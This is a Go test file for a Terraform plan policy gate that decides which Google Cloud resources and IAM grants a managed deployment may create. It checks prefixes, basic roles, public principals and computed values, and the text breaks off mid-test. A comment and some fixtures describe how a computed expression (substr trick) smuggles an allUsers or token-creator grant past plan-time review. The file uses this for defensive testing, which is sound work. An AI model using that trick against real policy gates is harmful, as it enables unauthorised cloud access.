package tf

import (
	"encoding/json"
	"slices"
	"strings"
	"testing"
)

// The managed allowlist (Task 1.1). These tests are the list's own review: one
// fixture per entry the list keeps, one per entry it leaves out, and one per
// naming rule, each named for the entry, so the list and its tests read side
// by side. The golden test at the top of the file pins the list against a
// literal, so a widening is a visible diff rather than a quiet one.

func managedTestCover() ManagedCover {
	return ManagedCover{Cover: Cover{
		Projects: []string{"proj-1"},
		Listed:   []string{"user:owner@example.com", "group:ops@example.com"},
		Registry: "us-east5-docker.pkg.dev",
		Region:   "us-east5",
		Buckets:  []string{"fugaro-runs-proj-1"},
		Billing:  []string{"AAAA-BBBB"},
	}}
}

// mrc is one resource of a managed plan, under Google's provider: the address
// is the type's own, so a refusal's address says which fixture it came from.
func mrc(typ string, after map[string]any) ResourceChange {
	if after == nil {
		after = map[string]any{}
	}
	return ResourceChange{Address: "module.managed." + typ + ".this", Mode: "managed", Type: typ,
		ProviderName: "registry.terraform.io/hashicorp/google",
		Change:       Change{Actions: []string{"create"}, After: after, AfterUnknown: map[string]any{}}}
}

// managedPlan is a plan of changes with a configuration that declares Google's
// provider, its project written out, and nothing else: the clean configuration
// every fixture of the resource rules shares (managed_apply_test.go holds the
// configuration's own).
func managedPlan(changes ...ResourceChange) *Plan {
	// Every before view is the one terraform's state writes, the per-instance
	// attribute of its type included (withInstance), so a fixture cannot
	// remove an object the rule cannot identify and read the refusal that
	// follows as the rule it meant to test.
	views := make([]ResourceChange, len(changes))
	for i, rc := range changes {
		views[i] = withInstance(rc)
	}
	return &Plan{FormatVersion: "1.2", ResourceChanges: views, Configuration: &Configuration{
		ProviderConfig: map[string]ProviderConfig{"google": {Name: "google", FullName: "registry.terraform.io/hashicorp/google",
			Expressions: map[string]json.RawMessage{"project": json.RawMessage(`{"constant_value":"proj-1"}`)}}}}}
}

// managedPlanConfigured is managedPlan with rc declared in the configuration,
// in the module mrc's address names, with the given expressions: what
// terraform writes for a resource, which says whether it sets project itself.
func managedPlanConfigured(rc ResourceChange, expressions map[string]json.RawMessage) *Plan {
	p := managedPlan(rc)
	name := strings.TrimPrefix(rc.Address, "module.managed.")
	p.Configuration.RootModule.ModuleCalls = map[string]ModuleCall{"managed": {Module: ConfigModule{
		Resources: []ConfigResource{{Address: name, Mode: "managed", Type: rc.Type, Expressions: expressions}}}}}
	return p
}

// managedAccount is the email of a managed service account of the managed
// project, the shape a managed plan's own grants point at.
const managedAccount = ManagedPrefix + "run@proj-1.iam.gserviceaccount.com"

// TestManagedAllowedTypesGolden pins both halves of the decision against
// literals: the 14 types a managed plan may contain, and the 12 entries of
// allowedTypes it may not. A widening — or a type dropped without a reason —
// is a diff in this test.
func TestManagedAllowedTypesGolden(t *testing.T) {
	want := []string{
		"google_apikeys_key",
		"google_artifact_registry_repository",
		"google_artifact_registry_repository_iam_member",
		"google_cloud_run_v2_job",
		"google_cloud_run_v2_job_iam_member",
		"google_cloud_scheduler_job",
		"google_project_service",
		"google_secret_manager_secret",
		"google_secret_manager_secret_iam_member",
		"google_service_account",
		"google_service_account_iam_member",
		"google_storage_bucket",
		"google_storage_bucket_iam_member",
		"google_storage_bucket_object",
	}
	if got := ManagedAllowedTypes(); !slices.Equal(got, want) {
		t.Errorf("the managed allowlist is %v, want %v", got, want)
	}
	wantDropped := []string{
		"google_billing_budget",
		// The credentials service (C1.18): Fugaro's own infrastructure, applied
		// by the owner-run installation root (D146), and a type the deployer
		// holds no run.services.* permission for.
		"google_cloud_run_v2_service",
		"google_cloud_run_v2_service_iam_member",
		// main's compute module's network (the compute backend, excluded from
		// 0.9.0), dropped on the merge of main into next-0.8.5 as the
		// fail-closed default.
		"google_compute_firewall",
		"google_compute_router",
		"google_compute_router_nat",
		"google_firebase_database_instance",
		"google_firebase_project",
		"google_logging_log_view",
		"google_logging_log_view_iam_member",
		"google_logging_project_bucket_config",
		"google_logging_project_exclusion",
		"google_logging_project_sink",
		"google_monitoring_alert_policy",
		"google_monitoring_notification_channel",
		"google_project_iam_custom_role",
		"google_project_iam_member",
	}
	if got := managedDroppedTypes(); !slices.Equal(got, wantDropped) {
		t.Errorf("the types the managed list drops are %v, want %v", got, wantDropped)
	}
}

// TestManagedAllowedTypesIsDecided is the completeness property: every type
// init's own cover allows is either kept by the managed list with a
// justification or left out with a reason, and nothing is on the managed list
// that no module declares. A type added to allowedTypes fails this test until
// it is decided here, so the managed list cannot be widened by silence.
func TestManagedAllowedTypesIsDecided(t *testing.T) {
	kept := map[string]bool{}
	for _, typ := range ManagedAllowedTypes() {
		kept[typ] = true
		if !allowedTypes[typ] {
			t.Errorf("the managed list keeps %s, which no module declares", typ)
		}
		if managedTypeReasons[typ] == "" {
			t.Errorf("%s is kept with no justification", typ)
		}
	}
	for typ, why := range managedDropped {
		if !allowedTypes[typ] {
			t.Errorf("the managed list drops %s, which is not a type the modules declare", typ)
		}
		if why == "" {
			t.Errorf("%s is dropped with no reason", typ)
		}
		if kept[typ] {
			t.Errorf("%s is both kept and dropped", typ)
		}
	}
	for typ := range allowedTypes {
		if !kept[typ] && managedDropped[typ] == "" {
			t.Errorf("%s is neither kept nor dropped: decide it in tf/managed_cover.go", typ)
		}
	}
	if got := ManagedAllowedTypes(); !slices.IsSorted(got) || len(got) != len(managedTypes) {
		t.Errorf("ManagedAllowedTypes is %v: not the list's own keys", got)
	}
}

// managedKeptFixture is one resource per type the list keeps: the type's own
// name carries the managed prefix, and the account it runs as, where it has
// one, is a managed account of the managed project. TestManagedCoverAdmits...
// fails when a kept type has none, so adding one to the list is adding a
// fixture beside it.
var managedKeptFixture = map[string]ResourceChange{
	"google_apikeys_key": mrc("google_apikeys_key", map[string]any{"name": ManagedPrefix + "web-key"}),
	"google_artifact_registry_repository": mrc("google_artifact_registry_repository", map[string]any{
		"repository_id": ManagedPrefix + "repo", "format": "DOCKER", "mode": "STANDARD_REPOSITORY"}),
	"google_artifact_registry_repository_iam_member": mrc("google_artifact_registry_repository_iam_member", map[string]any{
		"repository": ManagedPrefix + "repo", "member": "serviceAccount:" + managedAccount, "role": "roles/artifactregistry.reader"}),
	"google_cloud_run_v2_job": mrc("google_cloud_run_v2_job", map[string]any{
		"name": ManagedPrefix + "job",
		"template": []any{map[string]any{"template": []any{map[string]any{
			"service_account": managedAccount,
			"containers":      []any{map[string]any{"image": "us-east5-docker.pkg.dev/proj-1/" + ManagedPrefix + "img:1"}},
		}}}},
	}),
	"google_cloud_run_v2_job_iam_member": mrc("google_cloud_run_v2_job_iam_member", map[string]any{
		"name": ManagedPrefix + "job", "member": "serviceAccount:" + managedAccount, "role": "roles/run.invoker"}),
	"google_cloud_scheduler_job": mrc("google_cloud_scheduler_job", map[string]any{
		"name": ManagedPrefix + "sweep",
		"http_target": []any{map[string]any{"uri": "https://run.googleapis.com/v2/projects/proj-1/locations/us-east5/jobs/" + ManagedPrefix + "job:run",
			"oauth_token": []any{map[string]any{"service_account_email": managedAccount}}}}},
	),
	// The service is enabled by name, not created under one: the modules write
	// it as its own type and there is nothing about it to prefix.
	"google_project_service": mrc("google_project_service", map[string]any{"service": "run.googleapis.com"}),
	"google_secret_manager_secret": mrc("google_secret_manager_secret", map[string]any{
		"secret_id": ManagedPrefix + "token"}),
	"google_secret_manager_secret_iam_member": mrc("google_secret_manager_secret_iam_member", map[string]any{
		"secret_id": ManagedPrefix + "token", "member": "serviceAccount:" + managedAccount, "role": "roles/secretmanager.secretAccessor"}),
	"google_service_account": mrc("google_service_account", map[string]any{"account_id": ManagedPrefix + "sa"}),
	"google_service_account_iam_member": mrc("google_service_account_iam_member", map[string]any{
		"service_account_id": "projects/proj-1/serviceAccounts/" + managedAccount,
		"member":             "serviceAccount:" + managedAccount, "role": "roles/iam.serviceAccountUser"}),
	"google_storage_bucket": mrc("google_storage_bucket", map[string]any{"name": ManagedPrefix + "bucket"}),
	"google_storage_bucket_iam_member": mrc("google_storage_bucket_iam_member", map[string]any{
		"bucket": ManagedPrefix + "bucket", "member": "serviceAccount:" + managedAccount, "role": "roles/storage.objectViewer"}),
	"google_storage_bucket_object": mrc("google_storage_bucket_object", map[string]any{
		"bucket": ManagedPrefix + "bucket", "name": "results.json"}),
}

func TestManagedCoverAdmitsTheKeptTypes(t *testing.T) {
	for _, typ := range ManagedAllowedTypes() {
		t.Run(typ, func(t *testing.T) {
			fixture, ok := managedKeptFixture[typ]
			if !ok {
				t.Fatalf("%s is kept with no fixture: one belongs beside the entry", typ)
			}
			if got := managedTestCover().NotCovered(managedPlan(fixture), nil); len(got) != 0 {
				t.Fatalf("the %s fixture is not covered: %q", typ, got)
			}
		})
	}
}

// The same fixture with one of its names outside the prefix: one per entry,
// because the prefix rule is the entry's own condition in Task 1.1's table.
var managedOutsideFixture = map[string]ResourceChange{
	"google_apikeys_key": mrc("google_apikeys_key", map[string]any{"name": "fugaro-web"}),
	"google_artifact_registry_repository": mrc("google_artifact_registry_repository", map[string]any{
		"repository_id": "fugaro-base"}),
	"google_artifact_registry_repository_iam_member": mrc("google_artifact_registry_repository_iam_member", map[string]any{
		"repository": "fugaro-base", "member": "serviceAccount:" + managedAccount, "role": "roles/artifactregistry.reader"}),
	"google_cloud_run_v2_job": mrc("google_cloud_run_v2_job", map[string]any{
		"name":     "fugarohist",
		"template": []any{map[string]any{"template": []any{map[string]any{"service_account": managedAccount}}}},
	}),
	"google_cloud_run_v2_job_iam_member": mrc("google_cloud_run_v2_job_iam_member", map[string]any{
		"name": "fugarohist", "member": "serviceAccount:" + managedAccount, "role": "roles/run.invoker"}),
	"google_cloud_scheduler_job": mrc("google_cloud_scheduler_job", map[string]any{
		"name": "fugaro-history-sweep",
		"http_target": []any{map[string]any{
			"oauth_token": []any{map[string]any{"service_account_email": managedAccount}}}}},
	),
	"google_secret_manager_secret": mrc("google_secret_manager_secret", map[string]any{
		"secret_id": "fugaro-project"}),
	"google_secret_manager_secret_iam_member": mrc("google_secret_manager_secret_iam_member", map[string]any{
		"secret_id": "fugaro-project", "member": "serviceAccount:" + managedAccount, "role": "roles/secretmanager.viewer"}),
	"google_service_account": mrc("google_service_account", map[string]any{"account_id": "fugaro-history"}),
	"google_service_account_iam_member": mrc("google_service_account_iam_member", map[string]any{
		"service_account_id": "projects/proj-1/serviceAccounts/fugaro-scheduler@proj-1.iam.gserviceaccount.com",
		"member":             "serviceAccount:" + managedAccount, "role": "roles/iam.serviceAccountUser"}),
	"google_storage_bucket": mrc("google_storage_bucket", map[string]any{"name": "fugaro-runs-proj-1"}),
	"google_storage_bucket_iam_member": mrc("google_storage_bucket_iam_member", map[string]any{
		"bucket": "fugaro-other", "member": "serviceAccount:" + managedAccount, "role": "roles/storage.objectViewer"}),
	"google_storage_bucket_object": mrc("google_storage_bucket_object", map[string]any{
		"bucket": "fugaro-other", "name": "results.json"}),
}

func TestManagedCoverRefusesNamesOutsideThePrefix(t *testing.T) {
	for _, typ := range ManagedAllowedTypes() {
		if typ == "google_project_service" {
			continue // the service is enabled by name and carries no prefix
		}
		t.Run(typ, func(t *testing.T) {
			fixture, ok := managedOutsideFixture[typ]
			if !ok {
				t.Fatalf("%s has no outside-the-prefix fixture: one belongs beside the entry", typ)
			}
			out := managedTestCover().NotCovered(managedPlan(fixture), nil)
			if len(out) != 1 || !strings.HasPrefix(out[0], fixture.Address+" (") || !strings.Contains(out[0], ManagedPrefix) {
				t.Fatalf("a %s outside the prefix gives %q, want one refusal naming %s", typ, out, ManagedPrefix)
			}
		})
	}
}

// TestManagedCoverRefusesTheDroppedTypes is one fixture per entry the list
// deliberately excludes: each is refused for the type, whatever its
// attributes say, which is what makes the exclusion a decision.
func TestManagedCoverRefusesTheDroppedTypes(t *testing.T) {
	for _, typ := range managedDroppedTypes() {
		t.Run(typ, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(mrc(typ, nil)), nil)
			if len(out) != 1 || !strings.HasPrefix(out[0], "module.managed."+typ+".this (") {
				t.Fatalf("%s gives %q, want it refused for its type", typ, out)
			}
		})
	}
	if len(managedDroppedTypes()) != len(allowedTypes)-len(ManagedAllowedTypes()) {
		t.Errorf("the managed list keeps %d and drops %d of %d types", len(ManagedAllowedTypes()), len(managedDroppedTypes()), len(allowedTypes))
	}
}

// TestManagedCoverRefusesProjectLevelIAM is rule (a) and rule (d): a managed
// plan binds no project-level IAM and creates no custom role, which is the
// gate's half of the deployer's "no project-level setIamPolicy, no
// iam.roles.*" (D75 (iii)).
func TestManagedCoverRefusesProjectLevelIAM(t *testing.T) {
	for name, fixture := range map[string]ResourceChange{
		"a project-level role grant": mrc("google_project_iam_member", map[string]any{
			"member": "serviceAccount:" + managedAccount, "role": "roles/run.invoker"}),
		"a custom role": mrc("google_project_iam_custom_role", map[string]any{
			"role_id": "fmgdRole", "permissions": []any{"storage.objects.create"}}),
		"an authoritative binding": mrc("google_project_iam_binding", map[string]any{
			"members": []any{"serviceAccount:" + managedAccount}, "role": "roles/run.invoker"}),
		"a service account key": mrc("google_service_account_key", map[string]any{
			"service_account_id": "projects/proj-1/serviceAccounts/" + managedAccount}),
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(fixture), nil); len(out) != 1 {
				t.Fatalf("%s gives %q, want one refusal", name, out)
			}
		})
	}
}

// TestManagedCoverRefusesTheRunsBucketByName is rule (b): a bucket grant or
// an object on the installation's own runs bucket is refused by name, not
// merely by the prefix it happens not to carry. The runs bucket here is one
// the prefix rule admits, so the by-name rule is the only thing that can
// refuse it, and the refusal's reason is the by-name rule's own: a fixture
// named fugaro-runs-proj-1 would be refused by the prefix rule as well, and
// would stay red-proof with the by-name rule deleted.
func TestManagedCoverRefusesTheRunsBucketByName(t *testing.T) {
	runs := ManagedPrefix + "runs-proj-1"
	c := managedTestCover()
	c.Buckets = []string{runs}
	for name, fixture := range map[string]ResourceChange{
		"a bucket grant": mrc("google_storage_bucket_iam_member", map[string]any{
			"bucket": runs, "member": "serviceAccount:" + managedAccount, "role": "roles/storage.objectViewer"}),
		"an object": mrc("google_storage_bucket_object", map[string]any{
			"bucket": runs, "name": "fugaro/allow-delete.json"}),
	} {
		t.Run(name, func(t *testing.T) {
			if out := (ManagedCover{Cover: Cover{Projects: c.Projects, Listed: c.Listed}}).NotCovered(managedPlan(fixture), nil); len(out) != 0 {
				t.Fatalf("with no runs bucket named, %s on %s gives %q: the prefix rule refuses it, so this row cannot isolate the by-name rule", name, runs, out)
			}
			out := c.NotCovered(managedPlan(fixture), nil)
			if want := "on bucket " + runs + ", which is not the managed project's"; len(out) != 1 || !strings.Contains(out[0], want) {
				t.Fatalf("%s on the runs bucket gives %q, want one refusal %q", name, out, want)
			}
		})
	}
}

// TestManagedCoverRefusesTheBasicRoles: all three of the project's basic
// roles are refused on whatever resource they are written on, with the
// basic-role reason — roles/viewer included, which a member the review listed
// would otherwise be granted with no refusal at all. The list is a literal
// here and PrimitiveRoles is the single source the cover and the modules'
// own test read, so a role dropped from it is a diff in this test.
func TestManagedCoverRefusesTheBasicRoles(t *testing.T) {
	want := []string{"roles/editor", "roles/owner", "roles/viewer"}
	if got := slices.Sorted(slices.Values(PrimitiveRoles())); !slices.Equal(got, want) {
		t.Fatalf("PrimitiveRoles() = %v, want %v", got, want)
	}
	for _, role := range want {
		t.Run(role, func(t *testing.T) {
			fixture := mrc("google_storage_bucket_iam_member", map[string]any{
				"bucket": ManagedPrefix + "bucket", "member": "user:owner@example.com", "role": role})
			out := managedTestCover().NotCovered(managedPlan(fixture), nil)
			if len(out) != 1 || !strings.Contains(out[0], "basic role "+role) {
				t.Fatalf("a grant of %s gives %q, want one refusal naming it as a basic role", role, out)
			}
		})
	}
}

// managedInModule is rc at module path mod (empty for the root module): the
// computed-value rules trust a value only when the resource it may be
// computed from is created in the same module.
func managedInModule(rc ResourceChange, mod string) ResourceChange {
	rc.Address = rc.Type + ".this"
	if mod != "" {
		rc.Address = mod + "." + rc.Address
	}
	return rc
}

// withUnknown is rc with after_unknown set: the values the plan knows only
// after apply, which are absent from after.
func withUnknown(rc ResourceChange, unknown map[string]any) ResourceChange {
	rc.Change.AfterUnknown = unknown
	return rc
}

// TestManagedCoverComputedValues pins the rule for a value the plan knows only
// after apply: every name, account and member the cover reads is refused when
// it is computed, whatever else the plan creates beside it. A saved plan keeps
// only the references an expression uses, never the expression, so "computed
// from a resource the plan creates" cannot be proved from it: the attack rows
// below are each a value that is unknown at plan time yet whose result the plan
// chooses — member = "${substr(google_service_account.x.unique_id,0,0)}allUsers"
// reads as unknown, references a created account, and applies as allUsers.
// A refusal falls back to the confirmation path; a plan that names its own
// accounts and resources literally is covered.
func TestManagedCoverComputedValues(t *testing.T) {
	const mod = "module.managed"
	sa := managedInModule(mrc("google_service_account", map[string]any{"account_id": ManagedPrefix + "sa"}), mod)
	bucket := managedInModule(mrc("google_storage_bucket", map[string]any{"name": ManagedPrefix + "bucket"}), mod)
	secret := managedInModule(mrc("google_secret_manager_secret", map[string]any{"secret_id": ManagedPrefix + "token"}), mod)
	repo := managedInModule(mrc("google_artifact_registry_repository", map[string]any{"repository_id": ManagedPrefix + "repo", "mode": "STANDARD_REPOSITORY"}), mod)
	job := managedInModule(managedKeptFixture["google_cloud_run_v2_job"], mod)
	everything := []ResourceChange{sa, bucket, secret, repo, job}
	// computed is the kept fixture of typ with attr known only after apply,
	// in the module that creates everything a computed value could name.
	computed := func(typ, attr string, set map[string]any) ResourceChange {
		after := map[string]any{}
		for k, v := range managedKeptFixture[typ].Change.After {
			after[k] = v
		}
		delete(after, attr)
		for k, v := range set {
			after[k] = v
		}
		return managedInModule(withUnknown(mrc(typ, after), map[string]any{attr: true}), mod)
	}
	const memberWhy = "a member that is not known at plan time"
	for name, tc := range map[string]struct {
		rc  ResourceChange
		why string
	}{
		// (1) the member: the review's attack, on every grant type.
		"allUsers as storage.admin through a computed member": {computed("google_storage_bucket_iam_member", "member",
			map[string]any{"role": "roles/storage.admin"}), memberWhy},
		"token creator to an outsider through a computed member": {computed("google_service_account_iam_member", "member",
			map[string]any{"role": "roles/iam.serviceAccountTokenCreator"}), memberWhy},
		"a secret grant to a computed member":     {computed("google_secret_manager_secret_iam_member", "member", nil), memberWhy},
		"a repository grant to a computed member": {computed("google_artifact_registry_repository_iam_member", "member", nil), memberWhy},
		"a job grant to a computed member":        {computed("google_cloud_run_v2_job_iam_member", "member", nil), memberWhy},
		// (2) the names: "${substr(google_storage_bucket.b.name,0,0)}fugaro-runs-proj-1"
		// reads as unknown and applies as the runs bucket.
		"the marker through a computed bucket": {computed("google_storage_bucket_object", "bucket",
			map[string]any{"name": "fugaro/managed.json"}), "google_storage_bucket_object whose bucket is not known at plan time"},
		"a grant on a computed bucket": {computed("google_storage_bucket_iam_member", "bucket", nil),
			"google_storage_bucket_iam_member whose bucket is not known at plan time"},
		"a grant on a computed secret": {computed("google_secret_manager_secret_iam_member", "secret_id", nil),
			"google_secret_manager_secret_iam_member whose secret_id is not known at plan time"},
		"a grant on a computed repository": {computed("google_artifact_registry_repository_iam_member", "repository", nil),
			"google_artifact_registry_repository_iam_member whose repository is not known at plan time"},
		"a grant on a computed job": {computed("google_cloud_run_v2_job_iam_member", "name", nil),
			"google_cloud_run_v2_job_iam_member whose name is not known at plan time"},
		"a grant on a computed account": {computed("google_service_account_iam_member", "service_account_id", nil),
			"a grant on an account that is not known at plan time"},
		// The resources' own names were never trusted computed.
		"a computed bucket name": {computed("google_storage_bucket", "name", nil), "google_storage_bucket whose name is not known at plan time"},
		"a computed account id":  {computed("google_service_account", "account_id", nil), "google_service_account whose account_id is not known at plan time"},
		"a computed secret id":   {computed("google_secret_manager_secret", "secret_id", nil), "google_secret_manager_secret whose secret_id is not known at plan time"},
		"a computed job name":    {computed("google_cloud_run_v2_job", "name", nil), "google_cloud_run_v2_job whose name is not known at plan time"},
		"a computed key name":    {computed("google_apikeys_key", "name", nil), "google_apikeys_key whose name is not known at plan time"},
		"a computed repository":  {computed("google_artifact_registry_repository", "repository_id", nil), "google_artifact_registry_repository whose repository_id is not known at plan time"},
		"a computed schedule":    {computed("google_cloud_scheduler_job", "name", nil), "google_cloud_scheduler_job whose name is not known at plan time"},
		"a computed role":        {computed("google_storage_bucket_iam_member", "role", nil), "a role that is not known"},
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(append(slices.Clone(everything), tc.rc)...), nil)
			if len(out) != 1 || !strings.HasPrefix(out[0], tc.rc.Address+" (") || !strings.Contains(out[0], tc.why) {
				t.Fatalf("gives %q, want one refusal of %s: %q", out, tc.rc.Address, tc.why)
			}
		})
	}
	// The refusal says what to write instead: the account spelled out.
	out := managedTestCover().NotCovered(managedPlan(sa, computed("google_storage_bucket_iam_member", "member", nil)), nil)
	if len(out) != 1 || !strings.Contains(out[0], "serviceAccount:"+ManagedPrefix) {
		t.Errorf("a computed member gives %q, want a refusal naming the literal form", out)
	}
	// A grant to an account the module creates, written with its member, its
	// account and its bucket spelled out, is covered.
	literal := []ResourceChange{sa, bucket,
		managedInModule(managedKeptFixture["google_storage_bucket_iam_member"], mod),
		managedInModule(managedKeptFixture["google_service_account_iam_member"], mod)}
	if out := managedTestCover().NotCovered(managedPlan(literal...), nil); len(out) != 0 {
		t.Errorf("a grant to a created account, spelled out, gives %q, want it covered", out)
	}

	// The job's and the scheduler's accounts: never trusted computed either.
	jobComputedAccount := managedInModule(withUnknown(mrc("google_cloud_run_v2_job", map[string]any{
		"name": ManagedPrefix + "job", "template": []any{map[string]any{"template": []any{map[string]any{}}}}}),
		map[string]any{"template": []any{map[string]any{"template": []any{map[string]any{"service_account": true}}}}}), mod)
	schedComputedOAuth := managedInModule(withUnknown(mrc("google_cloud_scheduler_job", map[string]any{
		"name": ManagedPrefix + "sweep", "http_target": []any{map[string]any{"oauth_token": []any{map[string]any{}}}}}),
		map[string]any{"http_target": []any{map[string]any{"oauth_token": []any{map[string]any{"service_account_email": true}}}}}), mod)
	schedComputedOIDC := managedInModule(withUnknown(mrc("google_cloud_scheduler_job", map[string]any{
		"name": ManagedPrefix + "sweep", "http_target": []any{map[string]any{"oidc_token": []any{map[string]any{}}}}}),
		map[string]any{"http_target": []any{map[string]any{"oidc_token": []any{map[string]any{"service_account_email": true}}}}}), mod)
	schedComputedTarget := managedInModule(withUnknown(mrc("google_cloud_scheduler_job", map[string]any{
		"name": ManagedPrefix + "sweep"}), map[string]any{"http_target": true}), mod)
	for name, tc := range map[string]struct {
		rc  ResourceChange
		why string
	}{
		"a job whose account is computed":             {jobComputedAccount, "a job whose service account is not known"},
		"a scheduler whose OAuth account is computed": {schedComputedOAuth, "a scheduler whose service account is not known"},
		"a scheduler whose OIDC account is computed":  {schedComputedOIDC, "a scheduler whose service account is not known"},
		"a scheduler whose whole target is computed":  {schedComputedTarget, "a scheduler whose service account is not known"},
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(sa, tc.rc), nil)
			if len(out) != 1 || !strings.Contains(out[0], tc.why) {
				t.Fatalf("gives %q, want one refusal %q", out, tc.why)
			}
		})
	}
}

// TestManagedCoverRefusesTheStateBucketByThePrefix is D77's fixture: the
// dedicated state bucket, fugaro-managed-tfstate-<gcp-project>, must not match
// the managed prefix — a condition admitting it would hand the deployer the
// state of the very root it applies.
func TestManagedCoverRefusesTheStateBucketByThePrefix(t *testing.T) {
	for name, fixture := range map[string]ResourceChange{
		"a bucket": mrc("google_storage_bucket", map[string]any{"name": "fugaro-managed-tfstate-proj-1"}),
		"a bucket grant": mrc("google_storage_bucket_iam_member", map[string]any{
			"bucket": "fugaro-managed-tfstate-proj-1", "member": "serviceAccount:" + managedAccount, "role": "roles/storage.objectAdmin"}),
		"an object": mrc("google_storage_bucket_object", map[string]any{
			"bucket": "fugaro-managed-tfstate-proj-1", "name": "fugaro/managed/default.tfstate"}),
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(fixture), nil)
			if len(out) != 1 || !strings.Contains(out[0], ManagedPrefix) {
				t.Fatalf("the state bucket through %s gives %q, want one refusal naming %s", name, out, ManagedPrefix)
			}
		})
	}
}

// TestManagedPrefixDoesNotMatchFugarosOwnNames holds the constant itself: the
// prefix must not admit the runs bucket, the two state buckets, the fixed
// accounts, a per-job account, the installation's repositories or the web key.
func TestManagedPrefixDoesNotMatchFugarosOwnNames(t *testing.T) {
	for _, name := range []string{
		"fugaro-runs-proj-1",
		"fugaro-managed-tfstate-proj-1",
		"fugaro-tfstate-proj-1",
		"fugaro-scheduler", "fugaro-history", "fugaro-token-signer",
		"fugaro-b-acme-webapp-5b8bba58", "fugaro-web", "fugaro-base", "fugaro-ghcr",
		"proj-1-compute", "123456789-compute",
	} {
		if strings.HasPrefix(name, ManagedPrefix) {
			t.Errorf("the managed prefix %q admits Fugaro's own name %q", ManagedPrefix, name)
		}
	}
	if ManagedPrefix == "" || strings.HasPrefix("fugaro-managed-tfstate-proj-1", ManagedPrefix) {
		t.Errorf("the managed prefix %q is not usable", ManagedPrefix)
	}
}

// TestManagedCoverRefusesTheDefaultComputeAccount is rule (c)'s named case:
// the project's default compute account holds Editor by default, so a plan
// that runs a job as it, or grants IAM on it, is refused — while the same plan
// on a managed account is admitted.
func TestManagedCoverRefusesTheDefaultComputeAccount(t *testing.T) {
	const compute = "123456789-compute@developer.gserviceaccount.com"
	managed := ManagedPrefix + "run@proj-1.iam.gserviceaccount.com"
	for name, tc := range map[string]struct {
		typ, attr string
		account   string
	}{
		"a job running as it":                {"google_cloud_run_v2_job", "service_account", compute},
		"a job running as a managed account": {"google_cloud_run_v2_job", "service_account", managed},
		"a scheduler calling as it":          {"google_cloud_scheduler_job", "service_account_email", compute},
		"a scheduler calling as managed":     {"google_cloud_scheduler_job", "service_account_email", managed},
	} {
		t.Run(name, func(t *testing.T) {
			var fixture ResourceChange
			if tc.typ == "google_cloud_run_v2_job" {
				fixture = mrc(tc.typ, map[string]any{
					"name":     ManagedPrefix + "job",
					"template": []any{map[string]any{"template": []any{map[string]any{tc.attr: tc.account}}}},
				})
			} else {
				fixture = mrc(tc.typ, map[string]any{
					"name": ManagedPrefix + "sweep",
					"http_target": []any{map[string]any{
						"oauth_token": []any{map[string]any{tc.attr: tc.account}}}},
				})
			}
			out := managedTestCover().NotCovered(managedPlan(fixture), nil)
			wantRefused := tc.account == compute
			if wantRefused && (len(out) != 1 || !strings.Contains(out[0], compute)) {
				t.Fatalf("running as the default compute account gives %q, want one refusal naming it", out)
			}
			if !wantRefused && len(out) != 0 {
				t.Fatalf("running as a managed account gives %q, want it covered", out)
			}
		})
	}
}

// TestManagedCoverRefusesAnUnsetJobAccount is the other half of the same rule:
// a job with no service account runs as the default compute account, so it is
// refused rather than read as "nothing to check".
func TestManagedCoverRefusesAnUnsetJobAccount(t *testing.T) {
	for name, fixture := range map[string]ResourceChange{
		"a job with no account": mrc("google_cloud_run_v2_job", map[string]any{
			"name":     ManagedPrefix + "job",
			"template": []any{map[string]any{"template": []any{map[string]any{"containers": []any{}}}}},
		}),
		"a scheduler with no account": mrc("google_cloud_scheduler_job", map[string]any{
			"name":        ManagedPrefix + "sweep",
			"http_target": []any{map[string]any{}},
		}),
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(fixture), nil); len(out) != 1 {
				t.Fatalf("%s gives %q, want one refusal", name, out)
			}
		})
	}
}

// TestManagedCoverRefusesWiderPrincipals: a managed plan grants a role to the
// members the review listed or to a managed account of the managed project —
// never to everyone, a whole domain, another project's account, a computed
// role, or someone the review did not show.
func TestManagedCoverRefusesWiderPrincipals(t *testing.T) {
	grant := func(member, role string) ResourceChange {
		return mrc("google_storage_bucket_iam_member", map[string]any{
			"bucket": ManagedPrefix + "bucket", "member": member, "role": role})
	}
	for name, fixture := range map[string]ResourceChange{
		"everyone":                    grant("allUsers", "roles/storage.objectViewer"),
		"everyone signed in":          grant("allAuthenticatedUsers", "roles/storage.objectViewer"),
		"a whole domain":              grant("domain:example.com", "roles/storage.objectViewer"),
		"another project's account":   grant("serviceAccount:"+ManagedPrefix+"sa@other.iam.gserviceaccount.com", "roles/storage.objectViewer"),
		"the installations scheduler": grant("serviceAccount:fugaro-scheduler@proj-1.iam.gserviceaccount.com", "roles/storage.objectViewer"),
		"a person not on the screen":  grant("user:stranger@example.com", "roles/storage.objectViewer"),
		"no member":                   grant("", "roles/storage.objectViewer"),
		"the project's owner role":    grant("user:owner@example.com", "roles/owner"),
		"the project's editor role":   grant("user:owner@example.com", "roles/editor"),
		"the project's viewer role":   grant("user:owner@example.com", "roles/viewer"),
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(fixture), nil); len(out) != 1 {
				t.Fatalf("%s gives %q, want one refusal", name, out)
			}
		})
	}
	for name, member := range map[string]string{
		"a person the review listed":    "user:owner@example.com",
		"a group the review listed":     "group:ops@example.com",
		"a managed account":             "serviceAccount:" + managedAccount,
		"a managed account of the plan": "serviceAccount:" + ManagedPrefix + "other@proj-1.iam.gserviceaccount.com",
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(grant(member, "roles/storage.objectViewer")), nil); len(out) != 0 {
				t.Fatalf("%s gives %q, want it covered", name, out)
			}
		})
	}
}

// TestManagedCoverRefusesAComputedRole: a managed plan creates no custom role
// (rule (d)), so a role it does not spell out could be one the deployer holds
// no iam.roles.* to set.
func TestManagedCoverRefusesAComputedRole(t *testing.T) {
	fixture := mrc("google_storage_bucket_iam_member", map[string]any{"bucket": ManagedPrefix + "bucket", "member": "user:owner@example.com"})
	fixture.Change.AfterUnknown = map[string]any{"role": true}
	if out := managedTestCover().NotCovered(managedPlan(fixture), nil); len(out) != 1 {
